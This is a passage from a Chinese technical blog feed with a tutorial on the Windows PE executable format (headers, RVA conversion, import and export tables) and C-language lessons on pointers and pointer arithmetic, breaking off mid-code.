class="line">&#125;</span><br></pre></td></tr></table></figure><p>唯一的区别是对指针的自增遵循指针运算,而不是简单地将地址值+1.</p><p>指针自增实际上还有许多细节,易错点和应用技巧,他们和数组有着紧密的关联,后面细说.</p><br><p>关于指针运算,详见<a href="https://zh.cppreference.com/w/c/language/operator_arithmetic">算术运算符</a></p><p>本部分讲解了指针类型与指针运算,读者应该意识到(虽然可能为时尚早),<code>指针的行为与其类型息息相关</code>.</p><p>接下来的指针话题会涉及到数组,而且比较复杂.</p><br><br><p>上一篇:<a href="../2023-11-17-10666f346238">C语言教程-13_1-初识指针</a></p><p>下一篇:<a href="../2023-12-23-7cb717142d36">C语言教程-13_3-初探指针和数组的关系</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件分析</title>
      <link href="/2023-11-19-354e7a2c8c35/"/>
      <url>/2023-11-19-354e7a2c8c35/</url>
      
        <content type="html"><![CDATA[<h1 id="pe文件概述">PE文件概述</h1><p>Windows操作系统的<code>PE文件</code>(Portable Executable)和Linux操作系统下的ELF文件都是可执行文件的一种,均以UNIX平台的<code>COFF</code>(Common Object File Format,通用对象文件格式)制作而来.</p><p>PE文件是32位的可执行文件,也称为PE32,后来的64位可执行文件称为PE+或PE32+,是PE的扩展.</p><br><p>PE文件有如下几种格式:</p><table><thead><tr><th>种类</th><th>主扩展名</th><th>种类</th><th>主扩展名</th></tr></thead><tbody><tr><td>可执行系列</td><td>EXE,SCR</td><td>驱动程序类型</td><td>SYS,VXD</td></tr><tr><td>库系列</td><td>DLL,OCX,CPL,DRV</td><td>对象文件类型</td><td>OBJ</td></tr></tbody></table><p>严格来说,除了OBJ文件,其他的格式都是可执行的(部分可以以调试,服务等特殊方式运行)</p><br><p>注:在文章结尾有一张PE文件的示意图.</p><h1 id="pe文件分析">PE文件分析</h1><p>我们首先使用<code>010 Editor</code>进行分析,分析样例使用<code>Windows XP SP3</code>操作系统下的<code>notepad</code>记事本程序(32位).</p><h2 id="基本结构">基本结构</h2><p>需要明确的一点是,PE文件是可执行文件,这意味着其需要载入到内存中,PE文件在磁盘和内存中的结构是不同的.</p><p>下图展示了二者的差异:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119132011163.png" alt="image-20231119132011163" style="zoom:50%;" /><p>从<code>DOS头</code>到<code>节区头</code>是PE头部分,下面的合称为PE体.</p><p>为了定位PE中的数据,在文件中使用偏移(offset),在内存中使用VA(虚拟地址)进行定位.从图中可以看出,PE加载到内存中后,节区的大小和位置会发生变化,而不是原封不动地载入内存.</p><p>计算机中，为了提高处理文件、内存,网络包的效率，使用&quot;最小基本单位&quot;这一概念,PE文件中也类似.各节区的起始位置都在文件/内存最小单位的倍数位置处,空白的部分使用<code>NULL</code>进行填充.</p><h2 id="va和rva">VA和RVA</h2><p>VA指的是进程虚拟内存的绝对地址,RVA(Relative Virtual Address)则为相对地址,即相对基址的偏移.</p><p>PE头内部的信息大多为RVA,由于在载入内存时,该处可能已经加载有其他数据,所以需要重定向到其他位置,因此,只要能够保证RVA不变,根据不同的VA基地址,都可以正确找到各个数据.</p><p>换算公式如下:</p><p><code>RVA+ImageBase=VA</code></p><p>32位操作系统中,各进程有4GB的虚拟内存,所以VA范围从00000000~FFFFFFFF.</p><h2 id="pe头">PE头</h2><p>PE头包含各种结构体,保存着PE文件的各种信息.</p><h3 id="dos头-image-dos-header">DOS头-IMAGE_DOS_HEADER</h3><p>PE头创建之时,DOS文件正在被广泛使用,理所当然地PE文件对DOS文件进行了兼容,方法就是在PE头最前面加上一个DOS头.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119134323201.png" alt="image-20231119134323201" style="zoom:50%;" /><p>该结构体占用40字节,捡关键的说:</p><p><code>e_magic</code>成员:DOS签名(4D5A即为ASCII&quot;MZ&quot;)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119134551674.png" alt="image-20231119134551674" style="zoom:50%;" /><p><code>e_lfanew</code>成员:该成员的值指向后续的<code>NT头</code>所在位置</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119134748524.png" alt="image-20231119134748524" style="zoom:50%;" /><p>(注意小端序存储)</p><h3 id="dos存根">DOS存根</h3><p>该部分可选,有无均可,不影响程序运行,大小不固定.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119140245195.png" alt="image-20231119140245195" style="zoom:50%;" /><p>其中40到4D区域为16位的汇编指令,这里用于输出一个错误提示,即告诉用户该程序不能够在DOS模式下运行.</p><p>合理运用DOS存根可以产生一个既可以在DOS下运行,还可以在win32下运行的程序.</p><h3 id="nt头-image-nt-headers">NT头-IMAGE_NT_HEADERS</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119140618249.png" alt="image-20231119140618249" style="zoom:50%;" /><p>该结构体大小为F8,非常大.</p><p>Signature:值为<code>50450000</code>的ASCII&quot;PE&quot;00的签名</p><p>FileHeader:文件头</p><p>OptionalHeader:可选头</p><h4 id="文件头-image-file-header">文件头-IMAGE_FILE_HEADER</h4><p>该结构体存储了文件的大致属性.其中的几个十分重要,错误设置将导致文件无法正常运行.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119140936456.png" alt="image-20231119140936456" style="zoom:50%;" /><p>Machine:CPU的Machine码,兼容Intel x86芯片的Machine码为<code>14C</code>,其余还有:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119141203782.png" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119141203782.png" style="zoom:50%;" /><p>NumberOfSections:指出节区数,如果与实际不符,则会运行错误.</p><p>SizeOfOptionalHeader:尽管NT头的最后一个成员(IMAGE_OPTIONAL_HEADER32结构体)的大小已经定义,但是windows的PE装载器需要查看SizeOfOptionalHeader的值,以确定IMAGE_OPTIONAL_HEADER32结构体的大小.</p><p>Characteristics:根据该成员来识别文件的属性-是否可运行,是否为DLL文件等.使用<code>bit OR</code>形式组合起来.</p><p>值如下:(<code>记住0002h和2000h这两个值</code>)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119141939285.png" alt="image-20231119141939285" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119141955018.png" alt="image-20231119141955018" style="zoom:50%;" /><h4 id="可选头-image-optional-header32">可选头-IMAGE_OPTIONAL_HEADER32</h4><p>该头是PE头中最大的一个.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119142126868.png" alt="image-20231119142126868" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119142200511.png" alt="image-20231119142200511" style="zoom:50%;" /><p>重要的成员:</p><p>Magic:为IMAGE_OPTIONAL_HEADER32时,值为10B;为IMAGE_OPTIONAL_HEADER64时,值为20B.</p><p>AddressOfEntryPoint:存有EP(代码入口点)的RVA值.十分重要.</p><p>ImageBase:指出最先被装载的地址.</p><p>EXE,DLL文件被装载到0~7FFFFFFF;SYS文件被装载到80000000~FFFFFFFF.</p><p>SectionAlignment,FileAlignment:指定最小单位.</p><p>SizeOfImage:指出PE Image在虚拟内存中所占空间的大小.一般和文件中不同.</p><p>SizeOfHeader:指出整个PE头的大小.</p><p>Subsystem:用来区分系统驱动文件和普通的可执行文件.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119144701127.png" alt="image-20231119144701127" style="zoom:50%;" /><p>NumberOfRvaAndSizes:用来指定DataDirection数组的个数(?).</p><p>DataDirectory:各种表项,例如导入表和导出表等.每个元素都对应一种表项.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119144842497.png" alt="image-20231119144842497" style="zoom:50%;" /><h3 id="节区头-image-section-header">节区头-IMAGE_SECTION_HEADER</h3><p>节区头定义了各个节区的属性.PE文件将各种数据存储在不同的节区.而且不同的节区会有不同的权限:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119145151510.png" alt="image-20231119145151510" style="zoom:50%;" /><p>节区头是由IMAGE_SECTION_HEADER结构体组成的数组,每个结构体对应一个节区:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119150357510.png" alt="image-20231119150357510" style="zoom:50%;" /><p>结构体如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119150425129.png" alt="image-20231119150425129" style="zoom:50%;" /><p>重要的属性有如下几个:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119150459036.png" alt="image-20231119150459036" style="zoom:50%;" /><p>这些属性定位了后续PE体中对应的一个节区,例如<code>.text节区</code>.</p><h2 id="rva-to-raw">RVA to RAW</h2><p>这是一个最基本的转换,由于PE磁盘文件与其载入到内存的镜像文件并不完全一致,所以需要将进行RAW与RVA之间的转换.</p><p>首先查找<code>RVA</code>所在的节区,然后找到该节区的起始地址<code>Virtual Address</code>,注意这里的<code>Virtual Address</code>仍然是RVA(?).</p><p>然后找到<code>PointerToRawData</code>,就可以做差了.公式如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119151217154.png" alt="image-20231119151217154" style="zoom:50%;" /><p>含义即为:文件中该位置(RAW)到节区起点的偏移(两者之差) 与 内存映像中位置(RVA)到本节区起点的偏移(两者之差) 是相等的.</p><h2 id="iat-导入地址表">IAT-导入地址表</h2><p>Windows过去并没有<code>DLL</code>,只有<code>库(Library)</code>这一概念,这导致每一个程序要调用某一个库代码,都要进行包含,这就导致大量的空间浪费(每个使用该库的程序都有其一本副本).</p><p>现在,引入了DLL这一概念,可执行文件直接加载该DLL即可.在内存中只有一个DLL的代码.</p><p>加载DLL的方式有两种,一种是&quot;显式链接&quot;,即使用时进行加载,使用后释放内存;另一种是&quot;隐式链接&quot;,程序开始即加载,运行结束后释放,这种方式就与<code>IAT</code>有关.</p><br><p>PE文件提供了IAT内存区域,这里是编译器指定的一些内存,文件执行时,PE装载器将DLL中某些函数的实际地址(运行时确认)写入到这个位置,在程序代码中,访问一个库函数并不会将其硬编码到代码中,而是以IAT内存区域中某个内存中存储的地址值去进行call,这个地址值即为PE装载器在启动程序时确认的地址.这样实现由2个原因:</p><ol><li><p>之所以这样间接调用,是因为由于操作系统版本的不同,软件版本的不同,各个DLL中函数的实际地址并不相同,为了保证准确,将获取库函数实际地址的任务交给了PE装载器,在运行时确认当前DLL中库函数的地址.</p></li><li><p>另一方面,DLL的地址也并不是绝对的,例如某程序使用a.dll和b.dll,PE装载器将a.dll装载到10000000(ImageBase)处,然后尝试将b.dll也装载到此处,但是发现a.dll已经装载在此,理所当然地,便会将b.dll装载到其他位置.</p><p>这就是所谓的<code>DLL重定向</code>,我们无法在编写应用程序的时候就绝对确定一个DLL在内存中的位置.</p></li></ol><p>因此,实际上编译器需要指定程序中的一个内存空间,供PE装载器在执行时将正确的地址写入这个内存空间,在需要调用某个函数时,就从这个内存空间中读取载入的地址,然后进行call调用.</p><h3 id="image-import-descriptor结构体">IMAGE_IMPORT_DESCRIPTOR结构体</h3><p>该结构体中记录着PE文件要导入哪些库文件.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119153635416.png" alt="image-20231119153635416" style="zoom:50%;" /><p>每一个导入的库都会对应这样的一个结构体,组成结构体数组,最终以一个NULL填充的结构体结束:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119155203589.png" alt="image-20231119155203589" style="zoom:50%;" /><p>有时候,INT数组与IAT数组指向同一个位置(如下图),但是很多情况下并不是这样的.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119155313272.png" alt="image-20231119155313272" style="zoom: 33%;" /><p>PE装载器将导入函数写入IAT的顺序如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119155713902.png" alt="image-20231119155713902" style="zoom:50%;" /><h3 id="查找image-import-descriptor结构体数组">查找IMAGE_IMPORT_DESCRIPTOR结构体数组</h3><p>以notepad为例.</p><p>该数组并不在PE头中,而是在PE体中,不过,查找其位置的信息存储在PE头中.</p><p>在PE头的<code>IMAGE_OPTIONAL_HEADER32中,DataDirectory[1].VirtualAddress</code>的值即为<code>IMAGE_IMPORT_DESCRIPTOR结构体数组</code>的起始地址.</p><p>另外,IMAGE_IMPORT_DESCRIPTOR结构体数组也称为<code>IMPORT Directory Table</code>.</p><br><p>查看notepad的<code>DataDirectory数组</code>如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119160754825.png" alt="image-20231119160754825" style="zoom:50%;" /><p>找到对应的RVA(7604),根据公式转换为RAW(6A04),从文件中找到该位置:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119161113837.png" alt="image-20231119161113837" style="zoom:50%;" /><p>上图就是找到的数组,当前定位到其第一个元素,也就是第一个导入的dll库.</p><p>我们以这个元素举例(comdlg32.dll),展开分析(010Editor帮我们进行了分析):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119161248116.png" alt="image-20231119161248116"></p><ol><li>库名称Name:Name成员存储了一个RVA(7AAC),转换为RAW(6EAC),跳转过去就能找到这个库名字符串:</li></ol><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119161532401.png" alt="image-20231119161532401"></p><ol start="2"><li><p>OriginalFirstThunk - INT:INT为一个包含导入函数信息的结构体指针数组.根据这个数组的信息才能够找到对应函数的地址(参考后面EAT的内容).</p><p>跟踪该地址(同样计算RAW),得到:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119161942301.png" alt="image-20231119161942301" style="zoom:50%;" /><p>这里的每一个地址都指向一个<code>IMAGE_IMPORT_BY_NAME结构体</code>(如下所示).</p><p>根据每一个元素,例如第一个0x00007A7A(注意小端序),转为RAW为6E7A,继续跟踪可找到第一个函数名:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119162158565.png" alt="image-20231119162158565" style="zoom:50%;" /><p>这里的前2个字节(000F)为<code>Ordinary</code>,为库中函数的固有编号.</p></li><li><p>FirstThunk - IAT:IAT即为Import Address Table</p><p>IAT的RVA:12C4–&gt;RAW:6C4,跟踪过去得:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119162745029.png" alt="image-20231119162745029" style="zoom:50%;" /><p>这里的第一个元素被硬编码为76344906,但无实际意义,运行时会被准确的地址值覆盖.</p></li></ol><h2 id="eat-导出地址表">EAT-导出地址表</h2><p>与普通的应用程序不同,库文件(DLL,SYS)是为方便其他程序调用而集中包含了相关函数的文件.<code>Win32 API</code>是最具代表性的库,其中的<code>kernal32.dll</code>最为核心.</p><p>为了获取库文件中的函数信息,库必须使用EAT机制,用来求得库中各函数的地址.PE文件中,仅有一个<code>IMAGE_EXPORT_DIRECTORY结构体</code>来说明库EAT,而不是向IAT那样的数组,因为IAT可以导入多个库,而一个库只能导出自己.</p><h3 id="image-export-directory结构体">IMAGE_EXPORT_DIRECTORY结构体</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121172638880.png" alt="image-20231121172638880" style="zoom:50%;" /><p>重要成员如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121173202469.png" alt="image-20231121173202469" style="zoom:50%;" /><p>下面是kernel3.dll的整个EAT结构:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121175433331.png" alt="image-20231121175433331" style="zoom: 40%;" /><br><p>对照结构体声明和kernel32.dll的EAT结构,下面是寻找API的整个过程.从库中获得函数地址的API为<code>GetProcAddress()</code>函数,其引用EAT来获取指定API的地址.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121175814535.png" alt="image-20231121175814535" style="zoom: 33%;" /><p>总结来说就是,从函数名称数组中找到该函数名称的字符串,根据该字符串的下标name_index去查找ordinal数组,对应位置的元素值为ordinal,最后,在函数地址数组中以ordinal为下标找到函数的起始地址.</p><br><p>实际上,有些函数可能并没有函数名称(仅通过ordinal导出),可以通过从ordinal减去IMAGE_EXPORT_DIRECTORY.Base后得到的值作为函数地址数组的索引去查找函数地址.</p><h3 id="查找image-export-directory结构体">查找IMAGE_EXPORT_DIRECTORY结构体</h3><p>以Windows XP SP3的kernel32.dll为例.</p><p>和IAT同样,在NT头的<code>DataDirectory数组</code>中找到EAT的位置:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121172422745.png" alt="image-20231121172422745"></p><p>跳转到<code>0x1A2C</code>即可找到EAT:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121172558254.png" alt="image-20231121172558254" style="zoom:50%;" /><p>接下来就可以根据前面说的步骤去查找某个具体的函数了.</p><h1 id="总结">总结</h1><p>PE文件是Windows系统的可执行文件格式,了解PE文件结构才能够进一步学习更深的逆向技术.</p><p>后续还会看到各种PE文件的变体,例如被特殊的压缩程序进行压缩,用于非正常行为的程序(例如病毒等).</p><p>这是一张PE文件结构的示意图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/5427d0b798683a769cbf51d2c84b3664.png" alt="5427d0b798683a769cbf51d2c84b3664" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> RE </tag>
            
            <tag> 逆向工程核心原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-13_1-初识指针</title>
      <link href="/2023-11-17-10666f346238/"/>
      <url>/2023-11-17-10666f346238/</url>
      
        <content type="html"><![CDATA[<p>概要:</p><ol><li>简要讲解内存地址与内存模型</li><li>简单介绍C语言的指针这一数据类型</li><li>掌握指针相关最基本的两种互逆运算</li></ol><p>前置知识:</p><ol><li>理解能力和想象能力</li><li>耐心和实验精神</li><li>数组与函数的知识</li></ol><h1 id="交换两个变量的问题">交换两个变量的问题</h1><p>我们从一个问题开始引入指针.</p><p>考虑这个问题:<code>在main()函数中有两个int变量a和b,我该如何交换这两个变量的值?</code></p><p>如果我们要求仅在一个函数中解决这个问题,那么很容易想到,最简单的办法就是新建一个int类型的中间变量,比如命名为<code>temp</code>.那么我们就有如下操作进行交换(十分简单不详细解释):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">3</span>,b=<span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> c; <span class="comment">// 中间变量</span></span><br><span class="line">    <span class="comment">// 经典3步进行交换</span></span><br><span class="line">    c = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,a,b); <span class="comment">// 输出结果 a=4,b=3   </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要这3步即可进行交换.</p><br><p>现在问题来了,如果我们要求创建一个函数<code>swap()</code>来实现这个操作,该如何实现?</p><p>也许我们可以这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">4</span>;</span><br><span class="line">    swap(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>, a, b); <span class="comment">// 输出错误的结果:a=3,b=4   </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们尝试简单地把a和b传递给swap()函数,运行一下,结果显然是错误的,a和b的值并没有交换.</p><p>回顾前面<code>函数</code>的知识,前面讲过,C函数的参数都是按值传递,这里也就是将<code>main()</code>中的a和b的值简单地复制给<code>swap()</code>的两个参数a和b,换句话说,此a,b非彼a,b.</p><p>结果就是,在<code>swap()</code>中的a,b确实被成功地交换了,但是<code>main()</code>中的a,b完全没有变化.</p><br><p>我们想要在<code>swap()</code>函数中交换<code>main()</code>中的a和b,根本的问题在于我们需要访问到他们,C语言的<code>指针</code>类型提供了这种功能.</p><h1 id="地址和指针">地址和指针</h1><h2 id="计算机内存与地址">计算机内存与地址</h2><p>计算机运行时需要的各种数据都存储于内存中(就是平时说的内存条),从逻辑上来看,一整个内存可以视为一个超级巨大的数组,例如我们的内存是4GB,那么这个数组的总大小就是4GB.我们仅仅讲解<code>内存地址</code>这个概念,具体的内存结构这里并不关心.</p><p>程序的相关数据就存储在内存中,例如执行的机器代码,局部变量,全局变量(定义在函数外的变量),常量字面值.他们以某种特定的模式进行存储,存储的位置各不相同,为了找到他们,我们需要以字节为单位为整个内存进行编号.也就是所谓的<code>内存地址</code>.需要注意的是,我们通常以<code>16进制</code>来表示地址值(毕竟内存如此巨大,2,10进制是不够方便的).</p><p>以4GB内存举例,我们需要8个16进制位来完整编号,即<code>16^8==4,294,967,296</code>,也就是4GB的大小.从0开始,第一个字节编号为<code>0x00000000</code>,最后一个字节编号为<code>0xFFFFFFFF</code>.当然,如此庞大的内存范围不可能全部让我们任意取用,实际上我们自己的应用程序只能使用操作系统(例如Windows)规定的一块内存,当然这完全够用.</p><p>例如,我们在内存地址0x2~0x8存储了一些特定的数据,内容如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121002855398.png" alt="image-20231121002855398" style="zoom:50%;" /><p>可以看到每一个地址都<code>指向</code>内存中的一个特定字节,这个1字节大小的空间中存储了某些特定的数据,程序根据数据的地址从内存中找到他们,以进行运算.</p><br><p>另一方面,尽管我们对每一个字节都进行了编号,但是往往我们将若干个字节组合起来使用,例如一个int变量,就直接占用了4个字节,此时我们将4个连续的字节视为一个整体,取最开头的那个字节作为代表,指代整个int变量.</p><p>例如我们有<code>int i=2;</code>则i在内存中的布局如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121004333759.png" alt="image-20231121004333759" style="zoom:50%;" /><p>注意,我们上面的地址值仅仅作为演示,在现在流行的x64机器中并不是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// 使用循环,逐字节输出i在内存中的值(十六进制),同时输出每个字节的地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(i); j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%p %02x\n&quot;</span>, (<span class="type">char</span> *)&amp;i + j, *((<span class="type">char</span> *)&amp;i + j));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我的笔记本电脑运行如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121004620266.png" alt="image-20231121004620266" style="zoom:50%;" /><p>先不管上面的代码是什么原理,仅仅看一下结果,输出了i占用的这4个字节内部的值,同时可以看到前面的内存是连续的.如果我们使用<code>printf(&quot;%p&quot;,&amp;i);</code>输出i的地址,结果将会是第一个地址,这意味着使用最小的那个地址指代整个变量i.</p><p>读者无需关心为什么是<code>02 00 00 00</code>而不是<code>00 00 00 02</code>,这涉及到<code>大小端序</code>的问题.</p><h2 id="处理地址-c语言的指针">处理地址-C语言的指针</h2><p>现在我们已经了解了最基本的内存常识,并举了一个int变量的例子,了解了变量的存储.下面引入<code>指针</code>.</p><p>用最简单的一句话概括指针就是:<code>指针就是地址</code>.我们有时候需要在程序中获取到某个变量的地址,C语言提供了<code>指针</code>这一数据类型,用<code>指针类型</code>声明的变量就叫<code>指针变量</code>,其内部存储一个无符号的整数(往往是4或8字节大小),代表一个地址.</p><p>顾名思义,指针,就像一个箭头指向一个地方,和地址的作用相同.只不过前面说的<code>地址</code>是指计算机内存的编址,而指针,是C语言为了能够处理内存地址而引入的一种机制.某种角度而言,地址值仍然是一个整数,所以我们想要存储他,和普通的整数无异,但是为了特殊化,C语言引入了<code>指针类型</code>这种数据类型,这种(类)类型的变量存储的是一个特殊整数代表一个指针(地址).</p><br><p>获取一个变量的地址十分简单,使用<code>&amp;取地址运算符</code>,输入一个指针也很简单,在printf()中使用<code>%p</code>即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">3</span>; <span class="comment">// 声明并初始化为3一个int类型变量i</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,&amp;i); <span class="comment">// &amp;i这个表达式代表获取到i在内存中的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121005931082.png" alt="image-20231121005931082" style="zoom:50%;" /><p>这代表着变量i就存储在这个地址值指向的内存块中.</p><br><p>如果我们想要将这个地址存储下来,那么就需要使用C语言的<code>指针</code>.</p><p>声明一个最简单的指针变量仅仅需要在变量名前多加一个<code>*</code>,语法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">3</span>; <span class="comment">// 声明并初始化为3一个int类型变量i</span></span><br><span class="line">    <span class="type">int</span> *p; <span class="comment">// 声明一个变量p,其类型为int*,代表它是一个指针</span></span><br><span class="line">    p = &amp;i; <span class="comment">// 将i的地址赋值给p</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,p); <span class="comment">// 此时不再需要&amp;,因为p存储的就是i的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果同样,也是一个地址.</p><br><p>再进一步,我们既然存储了某个变量的地址(指针),那么就意味着我们想要根据这个地址(指针)去<code>访问</code>其指向的内存单元,我们使用另一种运算符,即<code>*解引用运算符(或者叫指针运算符)</code>,与<code>&amp;</code>相反,<code>*</code>用于对一个地址进行访问,反向获取到此处存储的具体变量(值),这种相对于<code>取地址</code>操作的逆操作称为<code>解引用</code>操作.</p><p>仍然是上面的例子,我们尝试使用p存储的地址去<code>间接</code>访问变量i:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 